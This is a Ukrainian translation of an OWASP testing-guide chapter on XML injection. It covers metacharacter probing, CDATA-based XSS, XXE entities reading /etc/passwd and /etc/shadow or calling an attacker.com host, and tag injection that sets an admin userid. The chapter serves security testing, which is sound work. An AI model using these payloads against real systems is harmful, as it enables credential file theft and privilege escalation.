## Тестування на XML ін'єкцію
| ID |
|:-:|
| WSTG-INPV-07 |

### Короткий опис
Тестування XML Injection - це коли тестувальник намагається вставити XML-документ у програму. Якщо аналізатору XML не вдасться контекстно перевірити дані, то тест дасть позитивний результат.

У цьому розділі описано практичні приклади використання XML-ін'єкції. Спочатку буде дано визначення стилю XML-зв'язку та пояснено його принципи роботи. Потім буде описано метод виявлення, за допомогою якого ми спробуємо вставити метасимволи XML. Після виконання першого кроку тестувальник матиме деяку інформацію про структуру XML, тому можна буде спробувати вставити XML-дані і теги (Tag Injection).

### Цілі тестування
- Визначити точки ін'єкції в XML.
- Оцінити типи вразливостей, які можуть бути досягнуті, та їх серйозність.

### Як протестувати
Припустимо, що існує веб-додаток, який використовує XML-зв'язок для реєстрації користувачів. Це робиться шляхом створення та додавання нового `user>`node у файл `xmlDb`.

Припустимо, що файл xmlDB має наступний вигляд:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```
Коли користувач реєструється, заповнюючи HTML-форму, додаток отримує дані користувача у стандартному запиті, який для простоти вважатимемо `GET`-запитом.

Наприклад, такі значення:
```
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com
```
створять запит:
```
http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com
```
Після цього програма створить наступний вузол:
```
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```
який буде додано до xmlDB:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>
```
#### Виявлення
Першим кроком для перевірки додатку на наявність вразливості XML Ін'єкції є спроба вставити метасимволи XML.

Метасимволами XML є:
- Одинарні лапки: `'` - Якщо цей символ не очищено, він може згенерувати виключення під час розбору XML, якщо введене значення буде частиною значення атрибуту в тегу.

Як приклад, припустимо, що є наступний атрибут:
```
<node attrib='$inputValue'/>
```
Отже, якщо
```
inputValue = foo'
```
ініційовано, а потім вставляється як значення атрибуту:
```
<node attrib='foo''/>
```
то результуючий XML-документ буде сформовано неправильно.
- Подвійні лапки: `"` - цей символ має те саме значення, що й одинарні лапки, і його можна використовувати, якщо значення атрибута взято в подвійні лапки.
```
<node attrib="$inputValue"/>
```
Отже, якщо
```
$inputValue = foo"
```
підстановка дає:
```
<node attrib="foo""/>
```
і отриманий XML-документ буде недійсним.
- Кутові дужки: `>` і `<` - додавання відкритих або закритих кутових дужок до вхідних даних користувача, як показано нижче:
```
Username = foo<
```
програма створить новий вузол:
```
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```
але, через наявність відкритого символу '<', отриманий XML-документ буде недійсним.
- Тег коментаря: `<!--/-->` - Ця послідовність символів інтерпретується як початок/кінець коментаря. Тому, ввівши один з них в параметр Username:
```
Username = foo<!--
```
програма побудує вузол, подібний до наступного:
```
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```
що не буде правильною XML-послідовністю.
- Амперсанд: `&`- Амперсанд використовується в синтаксисі XML для представлення сутностей. Формат сутності - `&symbol;`. Сутність зіставляється з символом з набору символів Unicode.

Наприклад:
```
<tagnode>&lt;</tagnode>
```
є правильно сформованим і допустимим, і представляє символ `<` ASCII.
Якщо `&` не закодовано за допомогою `&amp;`, його можна використовувати для тестування XML-ін'єкції.
Насправді, якщо введено вхідні дані на кшталт наступного:
```
Username = &foo
```
буде створено новий вузол:
```
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```
але, знову ж таки, документ не є дійсним: `&foo` не завершується символом `;`, а сутність `&foo;` не визначено.
- Розділювачі секцій CDATA: `<!\[CDATA\[ / ]]>` - секції CDATA використовуються для уникнення блоків тексту, що містять символи, які інакше були б розпізнані як розмітка. Іншими словами, символи, укладені в секцію CDATA, не обробляються синтаксичним аналізатором XML.

Наприклад, якщо потрібно представити рядок `<foo>` всередині текстового вузла, можна використати секцію CDATA:
```
<node>
    <![CDATA[<foo>]]>
</node>
```
щоб `<foo>` не сприймався як розмітка, а вважався символьними даними.
Якщо вузол створено наступним чином:
```
<username><![CDATA[<$userName]]></username>
```
тестувальник може спробувати вставити кінцевий рядок CDATA `]]>`, щоб спробувати зробити XML-документ недійсним.
```
userName = ]]>
```
це стане:
```
<username><![CDATA[]]>]]></username>
```
що не є валідним фрагментом XML.

Інший тест пов'язаний з тегом CDATA. Припустимо, що XML-документ обробляється для створення HTML-сторінки. У цьому випадку роздільники розділів CDATA можуть бути просто видалені, без подальшої перевірки їх вмісту. Тоді можна вставити HTML-теги, які будуть включені в згенеровану сторінку, повністю оминаючи існуючі процедури санітарної обробки.

Розглянемо конкретний приклад. Нехай у нас є вузол, що містить деякий текст, який буде показано користувачеві.
```
<html>
    $HTMLCode
</html>
```
Тоді зловмисник може ввести наступний код:
```
$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
```
і отримати наступний вузол:
```
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```
Під час обробки видаляються роздільники розділів CDATA, в результаті чого генерується наступний HTML-код:
```
<script>
    alert('XSS')
</script>
```
В результаті додаток стає вразливим до XSS.

Зовнішня сутність: Набір допустимих сутностей можна розширити, визначивши нові сутності. Якщо визначенням сутності є URI, сутність називається зовнішньою сутністю. Якщо не налаштовано інакше, зовнішні сутності змушують аналізатор XML звертатися до ресурсу, визначеного URI, наприклад, до файлу на локальній машині або на віддаленій системі. Така поведінка робить програму вразливою до атак XML eXternal Entity (XXE), які можуть бути використані для відмови в обслуговуванні локальної системи, отримання несанкціонованого доступу до файлів на локальній машині, сканування віддалених машин і відмови в обслуговуванні віддалених систем.

Для перевірки на наявність XXE вразливостей можна використати наступний ввід:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```
Цей тест може призвести до аварійного завершення роботи веб-сервера (на UNIX-системі), якщо XML-парсер спробує замінити сутність вмістом файлу /dev/random.

Інші корисні тести наведені нижче:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

#### Вставка тегів
Після виконання першого кроку тестувальник матиме деяку інформацію про структуру XML-документа. Після цього можна спробувати вставити XML-дані та теги. Ми покажемо приклад того, як це може призвести до атаки на підвищення привілеїв.

Розглянемо попередній додаток. Вставивши наступні значення:
```
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```
програма створить новий вузол і додасть його до бази даних XML:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```
Отриманий XML-файл добре сформований. Крім того, цілком ймовірно, що для користувача tony значення, пов'язане з тегом userid, є останнім, тобто 0 (ідентифікатор адміністратора). Іншими словами, ми ввели користувача з адміністративними привілеями.

Єдина проблема полягає в тому, що тег userid з'являється двічі в останньому вузлі користувача. Часто XML-документи пов'язані зі схемою або DTD і будуть відхилені, якщо вони не відповідають їй.

Припустимо, що XML-документ визначено наступним DTD:
```
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```
Зверніть увагу, що вузол userid визначено з кардинальністю 1. У цьому випадку атака, яку ми продемонстрували раніше (та інші прості атаки), не спрацює, якщо XML-документ буде перевірено на відповідність його DTD до того, як відбудеться будь-яка обробка.

Однак цю проблему можна вирішити, якщо тестувальник контролює значення деяких вузлів, що передують вузлу-порушнику (userid, в цьому прикладі). Фактично, тестувальник може закоментувати таку вершину, ввівши послідовність початку/кінця коментаря:
```
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```
У цьому випадку фінальною базою даних XML є:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```
Оригінальний вузол `userid` було закомментовано, залишивши лише введений вузол. Документ тепер відповідає правилам DTD.

### Огляд вихідного коду
Наступні Java API можуть бути вразливими до XXE, якщо вони не налаштовані належним чином.
```
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```
Перевірте вихідний код, чи docType, зовнішній DTD та сутності зовнішніх параметрів визначено як заборонені для використання.
- [Шпаргалка для запобігання зовнішнім об'єктам XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

Крім того, офісний зчитувач Java POI може бути вразливим до XXE, якщо його версія нижча за 3.10.1.

Версію бібліотеки POI можна визначити за назвою файлу JAR. Наприклад,
- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

Наступні ключові слова вихідного коду можуть застосовуватися до C.
- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader
